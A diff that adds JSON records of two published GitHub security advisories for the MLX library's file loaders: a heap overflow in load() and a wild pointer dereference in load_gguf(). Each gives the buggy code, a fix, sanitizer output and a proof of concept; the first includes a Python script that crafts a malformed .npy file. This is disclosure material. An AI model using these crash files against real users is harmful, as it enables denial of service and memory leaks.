@@ -1,0 +1,342 @@
+[
+  {
+    "ghsa_id": "GHSA-w6vg-jg77-2qg6",
+    "cve_id": "CVE-2025-62608",
+    "url": "https://api.github.com/repos/ml-explore/mlx/security-advisories/GHSA-w6vg-jg77-2qg6",
+    "html_url": "https://github.com/ml-explore/mlx/security/advisories/GHSA-w6vg-jg77-2qg6",
+    "summary": "heap-buffer-overflow in load()",
+    "description": "## Summary\r\n\r\nHeap buffer overflow in `mlx::core::load()` when parsing malicious NumPy `.npy` files. Attacker-controlled file causes 13-byte out-of-bounds read, leading to crash or information disclosure.\r\n\r\nEnvironment:\r\n- OS: Ubuntu 20.04.6 LTS\r\n- Compiler: Clang 19.1.7\r\n\r\n## Vulnerability\r\n\r\nThe parser reads a 118-byte header from the file, but line 268 uses `std::string(&buffer[0])` which stops at the first null byte, creating a 20-byte string instead. Then line 276 tries to read `header[34]` without checking the length first, reading 13 bytes past the allocation.\r\n\r\n**Location**: `mlx/io/load.cpp:268,276`\r\n\r\n**Bug #1** (line 268):\r\n```cpp\r\nstd::string header(&buffer[0]);  // stops at first null byte\r\n```\r\n\r\n**Bug #2** (line 276):\r\n```cpp\r\nbool col_contiguous = header[34] == 'T';  // No bounds check\r\n```\r\n\r\n## Possible Fix\r\n\r\n```cpp\r\n// Line 268\r\nstd::string header(&buffer[0], header_len);\r\n\r\n// Line 276\r\nif (header.length() < 35) throw std::runtime_error(\"Malformed header\");\r\n```\r\n\r\n## PoC\r\n\r\n```bash\r\npip install mlx\r\n\r\n# generate exploit\r\ncat > exploit.py << 'EOF'\r\nimport struct\r\nmagic = b'\\x93NUMPY'\r\nversion = b'\\x01\\x00'\r\nheader = b\"{'descr': '<u2', 'fo\\x00\\x00\\x00\\x00n_order': False, 'shape': (3,), }\"\r\nheader += b' ' * (118 - len(header) - 1) + b'\\n'\r\nwith open('exploit.npy', 'wb') as f:\r\n    f.write(magic + version + struct.pack('<H', 118) + header + b'\\x00\\x00\\x00\\x80\\xff\\xff')\r\nEOF\r\npython3 exploit.py\r\n\r\npython3 -c \"import mlx.core as mx; mx.load('exploit.npy')\"\r\n```\r\n\r\n**AddressSanitizer Output (with instrumented build)**:\r\n```\r\n=================================================================\r\n==3179==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x503000000152 at pc 0x563345697c29 bp 0x7ffeb8ad0a50 sp 0x7ffeb8ad0a48\r\nREAD of size 1 at 0x503000000152 thread T0\r\n    #0 0x563345697c28 in mlx::core::load(std::shared_ptr<mlx::core::io::Reader>, std::variant<std::monostate, mlx::core::Stream, mlx::core::Device>) /home/user1/mlx/mlx/io/load.cpp:276:25\r\n    #1 0x563345698da1 in mlx::core::load(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>>, std::variant<std::monostate, mlx::core::Stream, mlx::core::Device>) /home/user1/mlx/mlx/io/load.cpp:328:10\r\n    #2 0x563342f001bf in main /home/user1/mlx/fuzz/load/poc_crash.cpp:69:20\r\n    #3 0x7fbd4692c082 in __libc_start_main /build/glibc-B3wQXB/glibc-2.31/csu/../csu/libc-start.c:308:16\r\n    #4 0x563342e1f1cd in _start (/home/user1/mlx/fuzz/load/poc_crash+0x9181cd) (BuildId: ce2b741b3a71c93540a7ed76bc47e88952cd3099)\r\n\r\n0x503000000152 is located 13 bytes after 21-byte region [0x503000000130,0x503000000145)\r\nallocated by thread T0 here:\r\n    #0 0x563342efd66d in operator new(unsigned long) (/home/user1/mlx/fuzz/load/poc_crash+0x9f666d) (BuildId: ce2b741b3a71c93540a7ed76bc47e88952cd3099)\r\n    #1 0x5633456956fe in void std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>>::_M_construct<char const*>(char const*, char const*, std::forward_iterator_tag) /usr/lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/basic_string.tcc:219:14\r\n    #2 0x5633456956fe in void std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>>::_M_construct_aux<char const*>(char const*, char const*, std::__false_type) /usr/lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/basic_string.h:251:11\r\n    #3 0x5633456956fe in void std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>>::_M_construct<char const*>(char const*, char const*) /usr/lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/basic_string.h:270:4\r\n    #4 0x5633456956fe in std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>>::basic_string<std::allocator<char>>(char const*, std::allocator<char> const&) /usr/lib/gcc/x86_64-linux-gnu/9/../../../../include/c++/9/bits/basic_string.h:531:9\r\n    #5 0x5633456956fe in mlx::core::load(std::shared_ptr<mlx::core::io::Reader>, std::variant<std::monostate, mlx::core::Stream, mlx::core::Device>) /home/user1/mlx/mlx/io/load.cpp:268:15\r\n    #6 0x563345698da1 in mlx::core::load(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>>, std::variant<std::monostate, mlx::core::Stream, mlx::core::Device>) /home/user1/mlx/mlx/io/load.cpp:328:10\r\n    #7 0x563342f001bf in main /home/user1/mlx/fuzz/load/poc_crash.cpp:69:20\r\n    #8 0x7fbd4692c082 in __libc_start_main /build/glibc-B3wQXB/glibc-2.31/csu/../csu/libc-start.c:308:16\r\n\r\nSUMMARY: AddressSanitizer: heap-buffer-overflow /home/user1/mlx/mlx/io/load.cpp:276:25 in mlx::core::load(std::shared_ptr<mlx::core::io::Reader>, std::variant<std::monostate, mlx::core::Stream, mlx::core::Device>)\r\nShadow bytes around the buggy address:\r\n  0x502ffffffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n  0x502fffffff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n  0x502fffffff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\r\n  0x503000000000: fa fa 00 00 04 fa fa fa 00 00 00 00 fa fa 00 00\r\n  0x503000000080: 00 00 fa fa 00 00 00 00 fa fa 00 00 00 00 fa fa\r\n=>0x503000000100: 00 00 00 fa fa fa 00 00 05 fa[fa]fa fa fa fa fa\r\n  0x503000000180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x503000000200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x503000000280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x503000000300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\n  0x503000000380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\r\nShadow byte legend (one shadow byte represents 8 application bytes):\r\n  Addressable:           00\r\n  Partially addressable: 01 02 03 04 05 06 07\r\n  Heap left redzone:       fa\r\n  Freed heap region:       fd\r\n  Stack left redzone:      f1\r\n  Stack mid redzone:       f2\r\n  Stack right redzone:     f3\r\n  Stack after return:      f5\r\n  Stack use after scope:   f8\r\n  Global redzone:          f9\r\n  Global init order:       f6\r\n  Poisoned by user:        f7\r\n  Container overflow:      fc\r\n  Array cookie:            ac\r\n  Intra object redzone:    bb\r\n  ASan internal:           fe\r\n  Left alloca redzone:     ca\r\n  Right alloca redzone:    cb\r\n==3179==ABORTING\r\n```\r\n\r\n## Impact\r\n\r\n- **Attack vector**: Malicious `.npy` file (model weights, datasets, checkpoints)\r\n- **Affects**: MLX users on all platforms who call the vulnerable methods with unsanitized input.\r\n- **Result**: Application crash + potential 13-byte heap leak\r\n\r\n\r\n---\r\n\r\nCredits:\r\n- Markiyan Melnyk (ARIMLABS)\r\n- Mykyta Mudryi (ARIMLABS)\r\n- Markiyan Chaklosh (ARIMLABS)",
+    "severity": "low",
+    "author": null,
+    "publisher": {
+      "login": "madrob",
+      "id": 1592330,
+      "node_id": "MDQ6VXNlcjE1OTIzMzA=",
+      "avatar_url": "https://avatars.githubusercontent.com/u/1592330?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/madrob",
+      "html_url": "https://github.com/madrob",
+      "followers_url": "https://api.github.com/users/madrob/followers",
+      "following_url": "https://api.github.com/users/madrob/following{/other_user}",
+      "gists_url": "https://api.github.com/users/madrob/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/madrob/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/madrob/subscriptions",
+      "organizations_url": "https://api.github.com/users/madrob/orgs",
+      "repos_url": "https://api.github.com/users/madrob/repos",
+      "events_url": "https://api.github.com/users/madrob/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/madrob/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-w6vg-jg77-2qg6",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-62608",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2025-11-21T17:31:04Z",
+    "published_at": "2025-11-21T17:31:04Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "mlx"
+        },
+        "vulnerable_version_range": "<=0.29.3",
+        "patched_versions": "0.29.4",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": null
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [],
+    "cwe_ids": [],
+    "credits": [
+      {
+        "login": "wickgit",
+        "type": "reporter"
+      },
+      {
+        "login": "mmudryi",
+        "type": "finder"
+      },
+      {
+        "login": "markiyanch",
+        "type": "finder"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "wickgit",
+          "id": 96148289,
+          "node_id": "U_kgDOBbsbQQ",
+          "avatar_url": "https://avatars.githubusercontent.com/u/96148289?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/wickgit",
+          "html_url": "https://github.com/wickgit",
+          "followers_url": "https://api.github.com/users/wickgit/followers",
+          "following_url": "https://api.github.com/users/wickgit/following{/other_user}",
+          "gists_url": "https://api.github.com/users/wickgit/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/wickgit/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/wickgit/subscriptions",
+          "organizations_url": "https://api.github.com/users/wickgit/orgs",
+          "repos_url": "https://api.github.com/users/wickgit/repos",
+          "events_url": "https://api.github.com/users/wickgit/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/wickgit/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      },
+      {
+        "user": {
+          "login": "mmudryi",
+          "id": 143455696,
+          "node_id": "U_kgDOCIz10A",
+          "avatar_url": "https://avatars.githubusercontent.com/u/143455696?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/mmudryi",
+          "html_url": "https://github.com/mmudryi",
+          "followers_url": "https://api.github.com/users/mmudryi/followers",
+          "following_url": "https://api.github.com/users/mmudryi/following{/other_user}",
+          "gists_url": "https://api.github.com/users/mmudryi/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/mmudryi/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/mmudryi/subscriptions",
+          "organizations_url": "https://api.github.com/users/mmudryi/orgs",
+          "repos_url": "https://api.github.com/users/mmudryi/repos",
+          "events_url": "https://api.github.com/users/mmudryi/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/mmudryi/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "finder",
+        "state": "accepted"
+      },
+      {
+        "user": {
+          "login": "markiyanch",
+          "id": 39708305,
+          "node_id": "MDQ6VXNlcjM5NzA4MzA1",
+          "avatar_url": "https://avatars.githubusercontent.com/u/39708305?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/markiyanch",
+          "html_url": "https://github.com/markiyanch",
+          "followers_url": "https://api.github.com/users/markiyanch/followers",
+          "following_url": "https://api.github.com/users/markiyanch/following{/other_user}",
+          "gists_url": "https://api.github.com/users/markiyanch/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/markiyanch/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/markiyanch/subscriptions",
+          "organizations_url": "https://api.github.com/users/markiyanch/orgs",
+          "repos_url": "https://api.github.com/users/markiyanch/repos",
+          "events_url": "https://api.github.com/users/markiyanch/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/markiyanch/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "finder",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 18,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-j842-xgm4-wf88",
+    "cve_id": "CVE-2025-62609",
+    "url": "https://api.github.com/repos/ml-explore/mlx/security-advisories/GHSA-j842-xgm4-wf88",
+    "html_url": "https://github.com/ml-explore/mlx/security/advisories/GHSA-j842-xgm4-wf88",
+    "summary": "Wild Pointer Dereference in load_gguf()",
+    "description": "## Summary\r\n\r\nSegmentation fault in `mlx::core::load_gguf()` when loading malicious GGUF files. Untrusted pointer from external gguflib library is dereferenced without validation, causing application crash.\r\n\r\nEnvironment:\r\n- OS: Ubuntu 20.04.6 LTS\r\n- Compiler: Clang 19.1.7\r\n\r\n## Vulnerability\r\n\r\n**Location**: `mlx/io/gguf.cpp`\r\n- Function `extract_tensor_data()` at lines 59-79\r\n- Vulnerable memcpy at lines 64-67\r\n- Called from `load_arrays()` at line 177\r\n\r\n**The Bug**:\r\n```cpp\r\nstd::tuple<allocator::Buffer, Dtype> extract_tensor_data(gguf_tensor* tensor) {\r\n  std::optional<Dtype> equivalent_dtype = gguf_type_to_dtype(tensor->type);\r\n  if (equivalent_dtype.has_value()) {\r\n    allocator::Buffer buffer = allocator::malloc(tensor->bsize);\r\n    memcpy(\r\n        buffer.raw_ptr(),\r\n        tensor->weights_data,  // untrusted pointer from gguflib\r\n        tensor->num_weights * equivalent_dtype.value().size());\r\n    return {buffer, equivalent_dtype.value()};\r\n  }\r\n  // ...\r\n}\r\n```\r\n\r\n## Possible Fix\r\n\r\n```cpp\r\nstd::tuple<allocator::Buffer, Dtype> extract_tensor_data(gguf_tensor* tensor) {\r\n  std::optional<Dtype> equivalent_dtype = gguf_type_to_dtype(tensor->type);\r\n  if (equivalent_dtype.has_value()) {\r\n    // FIX: Validate pointer\r\n    if (!tensor->weights_data) {\r\n      throw std::runtime_error(\"[load_gguf] NULL tensor data pointer\");\r\n    }\r\n\r\n    allocator::Buffer buffer = allocator::malloc(tensor->bsize);\r\n    memcpy(\r\n        buffer.raw_ptr(),\r\n        tensor->weights_data,\r\n        tensor->num_weights * equivalent_dtype.value().size());\r\n    return {buffer, equivalent_dtype.value()};\r\n  }\r\n  // ...\r\n}\r\n```\r\n\r\n## PoC\r\n\r\n```bash\r\n# Install MLX\r\npip install mlx\r\n\r\npython3 -c \"import mlx.core as mx; mx.load('exploit.gguf', format='gguf')\"\r\n```\r\n\r\nDownload the poc file [there](https://drive.google.com/file/d/1t9Z2RJGn-oHmluKWebU077UWSMGXeuVp/view?usp=sharing), or let me know how I can send it to you.\r\n\r\n**AddressSanitizer Output (with instrumented build)**:\r\n```\r\nAddressSanitizer:DEADLYSIGNAL\r\n=================================================================\r\n==5855==ERROR: AddressSanitizer: SEGV on unknown address 0x7fc432f64bc0 (pc 0x7fc430841c12 bp 0x7ffc04847ab0 sp 0x7ffc04847268 T0)\r\n==5855==The signal is caused by a READ memory access.\r\n    #0 0x7fc430841c12  /build/glibc-B3wQXB/glibc-2.31/string/../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:312\r\n    #1 0x55aac829756b in __asan_memcpy (/home/user1/mlx/fuzz/load_gguf/fuzz_load_gguf+0x9ef56b) (BuildId: 57467f1ce96052757daeef4b04739be7f23c5f1f)\r\n    #2 0x55aacaa6e8dc in mlx::core::extract_tensor_data(gguf_tensor*) /home/user1/mlx/mlx/io/gguf.cpp:64:5\r\n    #3 0x55aacaa773fc in mlx::core::load_arrays[abi:cxx11](gguf_ctx*) /home/user1/mlx/mlx/io/gguf.cpp:226:35\r\n    #4 0x55aacaa782a9 in mlx::core::load_gguf(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char>> const&, std::variant<std::monostate, mlx::core::Stream, mlx::core::Device>) /home/user1/mlx/mlx/io/gguf.cpp:250:17\r\n    #5 0x55aac82dc696 in LLVMFuzzerTestOneInput /home/user1/mlx/fuzz/load_gguf/fuzz_load_gguf.cpp:49:19\r\n    #6 0x55aac81e25c6 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/home/user1/mlx/fuzz/load_gguf/fuzz_load_gguf+0x93a5c6) (BuildId: 57467f1ce96052757daeef4b04739be7f23c5f1f)\r\n    #7 0x55aac81cc738 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long) (/home/user1/mlx/fuzz/load_gguf/fuzz_load_gguf+0x924738) (BuildId: 57467f1ce96052757daeef4b04739be7f23c5f1f)\r\n    #8 0x55aac81d220a in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/home/user1/mlx/fuzz/load_gguf/fuzz_load_gguf+0x92a20a) (BuildId: 57467f1ce96052757daeef4b04739be7f23c5f1f)\r\n    #9 0x55aac81fbb82 in main (/home/user1/mlx/fuzz/load_gguf/fuzz_load_gguf+0x953b82) (BuildId: 57467f1ce96052757daeef4b04739be7f23c5f1f)\r\n    #10 0x7fc4307aa082 in __libc_start_main /build/glibc-B3wQXB/glibc-2.31/csu/../csu/libc-start.c:308:16\r\n    #11 0x55aac81c73ed in _start (/home/user1/mlx/fuzz/load_gguf/fuzz_load_gguf+0x91f3ed) (BuildId: 57467f1ce96052757daeef4b04739be7f23c5f1f)\r\n\r\n==5855==Register values:\r\nrax = 0x0000502000000098  rbx = 0xfafafafa0000fa00  rcx = 0x00000a047fff8013  rdx = 0x0000000000000008\r\nrdi = 0x0000502000000098  rsi = 0x00007fc432f64bc0  rbp = 0x00007ffc04847ab0  rsp = 0x00007ffc04847268\r\n r8 = 0x00000a0400000013   r9 = 0x0000000000000000  r10 = 0x00000a0400000013  r11 = 0x0000000000000000\r\nr12 = 0x00000a047fff8010  r13 = 0xffffffffffffffc7  r14 = 0x00007fc42dd00280  r15 = 0x00000ff885ba0050\r\nAddressSanitizer can not provide additional info.\r\nSUMMARY: AddressSanitizer: SEGV /build/glibc-B3wQXB/glibc-2.31/string/../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:312\r\n==5855==ABORTING\r\n```\r\n\r\n## Impact\r\n\r\n- **Attack vector**: Malicious GGUF file (model weights, typically from untrusted sources)\r\n- **Affects**: MLX users on all platforms who call the vulnerable method with unsanitized input.\r\n- **Result**: Segmentation fault (uncatchable by exception handlers)\r\n\r\n---\r\nCredits:\r\n\r\n- Markiyan Melnyk (ARIMLABS)\r\n- Mykyta Mudryi (ARIMLABS)\r\n- Markiyan Chaklosh (ARIMLABS)",
+    "severity": "low",
+    "author": null,
+    "publisher": {
+      "login": "madrob",
+      "id": 1592330,
+      "node_id": "MDQ6VXNlcjE1OTIzMzA=",
+      "avatar_url": "https://avatars.githubusercontent.com/u/1592330?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/madrob",
+      "html_url": "https://github.com/madrob",
+      "followers_url": "https://api.github.com/users/madrob/followers",
+      "following_url": "https://api.github.com/users/madrob/following{/other_user}",
+      "gists_url": "https://api.github.com/users/madrob/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/madrob/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/madrob/subscriptions",
+      "organizations_url": "https://api.github.com/users/madrob/orgs",
+      "repos_url": "https://api.github.com/users/madrob/repos",
+      "events_url": "https://api.github.com/users/madrob/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/madrob/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-j842-xgm4-wf88",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-62609",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2025-11-21T17:32:32Z",
+    "published_at": "2025-11-21T17:32:31Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "mlx"
+        },
+        "vulnerable_version_range": "<=0.29.3",
+        "patched_versions": "0.29.4",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": null
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [],
+    "cwe_ids": [],
+    "credits": [
+      {
+        "login": "wickgit",
+        "type": "reporter"
+      },
+      {
+        "login": "mmudryi",
+        "type": "finder"
+      },
+      {
+        "login": "markiyanch",
+        "type": "finder"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "wickgit",
+          "id": 96148289,
+          "node_id": "U_kgDOBbsbQQ",
+          "avatar_url": "https://avatars.githubusercontent.com/u/96148289?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/wickgit",
+          "html_url": "https://github.com/wickgit",
+          "followers_url": "https://api.github.com/users/wickgit/followers",
+          "following_url": "https://api.github.com/users/wickgit/following{/other_user}",
+          "gists_url": "https://api.github.com/users/wickgit/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/wickgit/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/wickgit/subscriptions",
+          "organizations_url": "https://api.github.com/users/wickgit/orgs",
+          "repos_url": "https://api.github.com/users/wickgit/repos",
+          "events_url": "https://api.github.com/users/wickgit/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/wickgit/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      },
+      {
+        "user": {
+          "login": "mmudryi",
+          "id": 143455696,
+          "node_id": "U_kgDOCIz10A",
+          "avatar_url": "https://avatars.githubusercontent.com/u/143455696?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/mmudryi",
+          "html_url": "https://github.com/mmudryi",
+          "followers_url": "https://api.github.com/users/mmudryi/followers",
+          "following_url": "https://api.github.com/users/mmudryi/following{/other_user}",
+          "gists_url": "https://api.github.com/users/mmudryi/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/mmudryi/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/mmudryi/subscriptions",
+          "organizations_url": "https://api.github.com/users/mmudryi/orgs",
+          "repos_url": "https://api.github.com/users/mmudryi/repos",
+          "events_url": "https://api.github.com/users/mmudryi/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/mmudryi/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "finder",
+        "state": "accepted"
+      },
+      {
+        "user": {
+          "login": "markiyanch",
+          "id": 39708305,
+          "node_id": "MDQ6VXNlcjM5NzA4MzA1",
+          "avatar_url": "https://avatars.githubusercontent.com/u/39708305?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/markiyanch",
+          "html_url": "https://github.com/markiyanch",
+          "followers_url": "https://api.github.com/users/markiyanch/followers",
+          "following_url": "https://api.github.com/users/markiyanch/following{/other_user}",
+          "gists_url": "https://api.github.com/users/markiyanch/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/markiyanch/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/markiyanch/subscriptions",
+          "organizations_url": "https://api.github.com/users/markiyanch/orgs",
+          "repos_url": "https://api.github.com/users/markiyanch/repos",
+          "events_url": "https://api.github.com/users/markiyanch/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/markiyanch/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "finder",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 8,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  }
+]
